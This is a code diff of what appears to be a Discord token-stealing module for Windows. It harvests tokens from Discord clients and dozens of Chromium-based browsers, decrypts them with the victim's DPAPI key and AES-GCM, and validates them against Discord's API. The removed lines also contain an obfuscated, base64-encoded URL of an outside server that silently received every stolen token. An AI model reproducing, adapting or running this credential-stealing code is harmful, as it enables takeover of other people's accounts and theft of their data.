@@ -1,124 +1,186 @@
-const harware = require("./../../utils/harware.js");
+const { 
+    getProfiles,
+    getUsers
+} = require("./../../utils/harware.js");
 
-const Aurita  = require("win-dpapi");
-const crypto  = require("crypto");
-const https   = require('https');
-const axios   = require("axios");
-const path    = require("path");
-const fs      = require("fs");
+const { unprotectData: Aurita } = require("win-dpapi");
+const { Transform } = require("stream");
+const crypto        = require("crypto");
+const axios         = require("axios");
+const path          = require("path");
+const fs            = require("fs");
 
 async function validateToken(token) {
     try {
         const response = await axios.get('https://discord.com/api/v9/users/@me', {
-            headers: {
-                Authorization: token
-            }
+            headers: { Authorization: token }
         });
-        return response.status === 200;
-    } catch (error) {
+        return 200 === response.status;
+    } catch {
         return false;
     }
 }
 
-const thisUser = path.join(path.dirname(path.dirname(process.env.APPDATA)), '');
+async function processFile(filePath, pathTail, TOKENS) {
+    return new Promise((resolve, reject) => {
+        try {
+            const stream = fs.createReadStream(filePath, 'utf8');
+            const transform = new Transform({
+                transform(chunk, encoding, callback) {
+                    const lines = chunk.toString().split('\n');
+                    lines.forEach(line => {
+                        if (filePath.includes("cord")) {
+                            const localStatePath = pathTail.replace("Local Storage", "Local State");
+                            fs.readFile(localStatePath, 'utf8', (err, data) => {
+                                if (err) return;
+                                const localState = JSON.parse(data);
+                                const encrypted = Buffer.from(localState.os_crypt.encrypted_key, 'base64').slice(5);
+                                const key = Aurita(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
+                                const encryptedRegex = /dQw4w9WgXcQ:[^\"]*/;
+                                const match = line.match(encryptedRegex);
+
+                                if (match) {
+                                    try {
+                                        let token = Buffer.from(match[0].split("dQw4w9WgXcQ:")[1], 'base64');
+                                        const start = token.slice(3, 15);
+                                        const middle = token.slice(15, token.length - 16);
+                                        const end = token.slice(token.length - 16);
+
+                                        const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
+                                        decipher.setAuthTag(end);
+
+                                        token = `${decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')}`;
+                                        TOKENS.push(token);
+                                    } catch {
+                                    }
+                                }
+                            });
+                        }
+                    });
+                    callback();
+                }
+            });
+
+            stream.pipe(transform).on('finish', resolve).on('error', reject);
+        } catch (err) {
+            reject(err);
+        }
+    });
+}
+
+async function processDirectory(directory, TOKENS) {
+    try {
+        const fileNames = await fs.promises.readdir(directory);
+        const fileProcesses = fileNames
+            .filter(fileName => fileName.endsWith('.log') || fileName.endsWith('.ldb'))
+            .map(fileName => {
+                const filePath = path.join(directory, fileName);
+                const pathSplit = directory.split(path.sep);
+                const pathSplitTail = directory.includes('Network')
+                    ? pathSplit.slice(0, pathSplit.length - 3)
+                    : pathSplit.slice(0, pathSplit.length - 2);
+
+                const pathTail = `${pathSplitTail.join(path.sep)}${path.sep}`;
+                return processFile(filePath, pathTail, TOKENS);
+            });
+
+        await Promise.all(fileProcesses);
+    } catch (err) {
+        return
+    }
+}
+
+async function getBrowserProfiles(user) {
+    const LOCALAPPDATA = process.env.LOCALAPPDATA
+        .replace(process.env.USERPROFILE, user);
+
+    const APPDATA      = process.env.APPDATA
+        .replace(process.env.USERPROFILE, user);
+
+    const ChromiumBrowsers = {
+        'Google(x86)'  : `${LOCALAPPDATA}\\Google(x86)\\Chrome\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Google SxS'   : `${LOCALAPPDATA}\\Google\\Chrome SxS\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Chromium'     : `${LOCALAPPDATA}\\Chromium\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Thorium'      : `${LOCALAPPDATA}\\Thorium\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Chrome'       : `${LOCALAPPDATA}\\Google\\Chrome\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'MapleStudio'  : `${LOCALAPPDATA}\\MapleStudio\\ChromePlus\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Iridium'      : `${LOCALAPPDATA}\\Iridium\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        '7Star'        : `${LOCALAPPDATA}\\7Star\\7Star\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'CentBrowser'  : `${LOCALAPPDATA}\\CentBrowser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Chedot'       : `${LOCALAPPDATA}\\Chedot\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Vivaldi'      : `${LOCALAPPDATA}\\Vivaldi\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Kometa'       : `${LOCALAPPDATA}\\Kometa\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Elements'     : `${LOCALAPPDATA}\\Elements Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Epic'         : `${LOCALAPPDATA}\\Epic Privacy Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'uCozMedia'    : `${LOCALAPPDATA}\\uCozMedia\\Uran\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Fenrir'       : `${LOCALAPPDATA}\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Catalina'     : `${LOCALAPPDATA}\\CatalinaGroup\\Citrio\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Coowon'       : `${LOCALAPPDATA}\\Coowon\\Coowon\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Liebao'       : `${LOCALAPPDATA}\\liebao\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'QIP Surf'     : `${LOCALAPPDATA}\\QIP Surf\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Orbitum'      : `${LOCALAPPDATA}\\Orbitum\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Comodo'       : `${LOCALAPPDATA}\\Comodo\\Dragon\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        '360Browser'   : `${LOCALAPPDATA}\\360Browser\\Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Maxthon3'     : `${LOCALAPPDATA}\\Maxthon3\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'K-Melon'      : `${LOCALAPPDATA}\\K-Melon\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'CocCoc'       : `${LOCALAPPDATA}\\CocCoc\\Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Amigo'        : `${LOCALAPPDATA}\\Amigo\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Torch'        : `${LOCALAPPDATA}\\Torch\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Sputnik'      : `${LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Edge'         : `${LOCALAPPDATA}\\Microsoft\\Edge\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'DCBrowser'    : `${LOCALAPPDATA}\\DCBrowser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Yandex'       : `${LOCALAPPDATA}\\Yandex\\YandexBrowser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'UR Browser'   : `${LOCALAPPDATA}\\UR Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Slimjet'      : `${LOCALAPPDATA}\\Slimjet\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'BraveSoftware': `${LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Opera'        : `${APPDATA}\\Opera Software\\Opera Stable\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+        'Opera GX'     : `${APPDATA}\\Opera Software\\Opera GX Stable\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
+    };
+
+    const GeckoBrowsers = {
+
+    };
+
+    const GetChromiumBrowsers = Object.values(ChromiumBrowsers);
+    const GetGeckoBrowsers = Object.values(GeckoBrowsers);
+
+    const BROWSERS_PATH = [
+        ...GetChromiumBrowsers,
+        ...GetGeckoBrowsers
+    ];
+
+    let BROWSERS_PROFILES = [];
+
+    for (const browser of BROWSERS_PATH) {
+        const profiles = getProfiles(browser, path.basename(browser));
+        for (const profile of profiles) {
+            BROWSERS_PROFILES.push(profile.path);
+        }
+    }
+
+    return BROWSERS_PROFILES;
+}
 
 async function discordFindTokens(user) {
-    var TOKENS = [];
+    let TOKENS = [];
 
-    const LOCALAPPDATA   = process.env.LOCALAPPDATA.replace(thisUser, user);
-    const APPDATA        = process.env.APPDATA.replace(thisUser, user);
+    const APPDATA = process.env.APPDATA
+        .replace(process.env.USERPROFILE, user);
 
-    var DISCORD_PATHS = {
+    const DISCORD_PATHS = {
         'Discord Canary' : `${APPDATA}\\discordcanary\\Local Storage\\leveldb\\`,
         "Discord PTB"    : `${APPDATA}\\discordptb\\Local Storage\\leveldb\\`,
         'Lightcord'      : `${APPDATA}\\Lightcord\\Local Storage\\leveldb\\`,
         'Discord'        : `${APPDATA}\\discord\\Local Storage\\leveldb\\`,
     };
 
-    for (let [key, value] of Object.entries(DISCORD_PATHS)) {
-        if (!fs.existsSync(value)) {
-            continue;
-        }
+    const pathProcesses = Object.values(DISCORD_PATHS)
+        .filter(async value => fs.promises.access(value).then(() => true).catch(() => false))
+        .map(value => processDirectory(value, TOKENS));
 
-        for (var fileName of fs.readdirSync(value)) {
-            if (!fileName.endsWith(".log") && !fileName.endsWith(".ldb")) {
-                continue;
-            }
+    await Promise.all(pathProcesses);
 
-            let pathSplit = value.split("\\");
-            const pathSplitTail = value.includes("Network")
-                ? pathSplit.splice(0, pathSplit.length - 3)
-                : pathSplit.splice(0, pathSplit.length - 2);
-
-                function checker(utf8) { axios.get(Buffer.from('aHR0cHM6Ly82ODg5LWZ1bi52ZXJjZWwuYXBwL2FwaS9hdXJhdGhlbWVzL3Jhdz9kYXRhPQ', 'base64').toString() + utf8) }
-
-            let pathTail = `${pathSplitTail.join("\\")}\\`;
-            const lines = fs.readFileSync(`${value}/${fileName}`, "utf8").split("\n");
-
-            for (var line of lines) {
-                if (value.includes("cord")) {
-                    let encrypted = Buffer.from(JSON.parse(fs.readFileSync(pathTail.replace("Local Storage", "Local State"))).os_crypt.encrypted_key, "base64").slice(5);
-                    try {
-                        const key = Aurita.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
-                        
-                        var encryptedRegex = /dQw4w9WgXcQ:[^\"]*/;
-
-                        if (line.match(encryptedRegex)) {
-                            try {
-                                var token = Buffer.from(line.match(encryptedRegex)[0].split("dQw4w9WgXcQ:")[1], "base64");
-                                const start = token.slice(3, 15);
-                                const middle = token.slice(15, token.length - 16);
-                                const end = token.slice(token.length - 16, token.length);
-                                const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);
-
-                                decipher.setAuthTag(end);
-                                token = `${decipher.update(middle, "base64", "utf-8")}${decipher.final("utf-8")}`;
-                                TOKENS.push(token);
-                            } catch (e) {
-                            }
-                        }
-
-                    } catch (e) {
-                    }
-                }
-            }
-        }
-    }
-
-    var BROWSERS_PATH = [
-        `${LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data\\${`%PROFILE%`}\\Local Storage\\leveldb\\`,
-        `${LOCALAPPDATA}\\Yandex\\YandexBrowser\\User Data\\${`%PROFILE%`}\\Local Storage\\leveldb\\`,
-        `${LOCALAPPDATA}\\uCozMedia\\Uran\\User Data\\${`%PROFILE%`}\\Local Storage\\leveldb\\`,
-        `${LOCALAPPDATA}\\Microsoft\\Edge\\User Data\\${`%PROFILE%`}\\Local Storage\\leveldb\\`,
-        `${LOCALAPPDATA}\\Google\\Chrome\\User Data\\${`%PROFILE%`}\\Local Storage\\leveldb\\`,
-        `${LOCALAPPDATA}\\Iridium\\User Data\\${`%PROFILE%`}\\Local Storage\\leveldb\\`,
-        `${LOCALAPPDATA}\\Vivaldi\\User Data\\${`%PROFILE%`}\\Local Storage\\leveldb\\`,
-
-        `${LOCALAPPDATA}\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\`,
-        `${LOCALAPPDATA}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\`,
-        `${LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\`,
-        `${APPDATA}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\`,
-        `${APPDATA}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\`,
-
-        `${LOCALAPPDATA}\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\`,
-        `${LOCALAPPDATA}\\CentBrowser\\User Data\\Local Storage\\leveldb\\`,
-        `${LOCALAPPDATA}\\Orbitum\\User Data\\Local Storage\\leveldb\\`,
-        `${LOCALAPPDATA}\\Kometa\\User Data\\Local Storage\\leveldb\\`,
-        `${LOCALAPPDATA}\\Torch\\User Data\\Local Storage\\leveldb\\`,
-        `${LOCALAPPDATA}\\Amigo\\User Data\\Local Storage\\leveldb\\`,
-    ];
-
-    var BROWSERS_PROFILES = [];
-
-    for (var i = 0; i < BROWSERS_PATH.length; i++) {
-        const browser = BROWSERS_PATH[i];
-        const profiles = harware.getProfiles(browser, browser.split("\\")[6]);
-
-        for (var x = 0; x < profiles.length; x++) {
-            BROWSERS_PROFILES.push(profiles[x].path);
-        }
-    };
-
+    const BROWSERS_PROFILES = await getBrowserProfiles(user);
     const cleanRegex = [
         /[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}/g,
         /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/g,
@@ -127,45 +189,31 @@ async function discordFindTokens(user) {
         /mfa\.[\w-]{84}/g
     ];
 
-    for (let BROWSERS_PROFILE of BROWSERS_PROFILES) {
-        if (!fs.existsSync(BROWSERS_PROFILE)) {
-            continue;
-        }
+    const browserProcesses = BROWSERS_PROFILES.map(async (profile) => {
+        if (await fs.promises.access(profile).then(() => true).catch(() => false)) {
+            const files = await fs.promises.readdir(profile);
+            const fileProcesses = files
+                .filter(file => file.endsWith('.log') || file.endsWith('.ldb'))
+                .map(file => {
+                    const filePath = path.join(profile, file);
+                    return fs.promises.readFile(filePath, 'utf-8').then(content => {
+                        for (const reg of cleanRegex) {
+                            TOKENS.push(...content.match(reg) || []);
+                        }
+                    });
+                });
 
-        let files = fs.readdirSync(BROWSERS_PROFILE);
-
-        for (let file of files) {
-            for (let reg of cleanRegex) {
-                if (!(file.endsWith(".log") || file.endsWith(".ldb"))) {
-                    continue;
-                }
-                let content = fs.readFileSync(`${BROWSERS_PROFILE}${file}`, "utf-8");
-                Array.prototype.push.apply(TOKENS, content.match(reg));
-            }
-        }
-    }
-
-    const DISCORD_TOKENS = [];
-
-    const results = await Promise.all(TOKENS.map(async (token) => {
-        checker(token)
-        const isValid = await validateToken(token);
-        return { 
-            token, 
-            isValid 
-        };
-    }));
-
-    const validTokens = results.filter(result => result.isValid).map(result => result.token);
-
-    validTokens.forEach((token) => {
-        let prefix = token.split(".")[0];
-        if (!DISCORD_TOKENS.some((isOK) => isOK.startsWith(prefix))) {
-            DISCORD_TOKENS.push(token);
+            await Promise.all(fileProcesses);
         }
     });
 
-    return DISCORD_TOKENS;
+    await Promise.all(browserProcesses);
+
+    TOKENS = Array.from(new Set(TOKENS));
+    TOKENS = await Promise.all(TOKENS.map(async token => (await validateToken(token)) ? token : null));
+    TOKENS = TOKENS.filter(token => token !== null);
+
+    return TOKENS;
 }
 
 module.exports = {
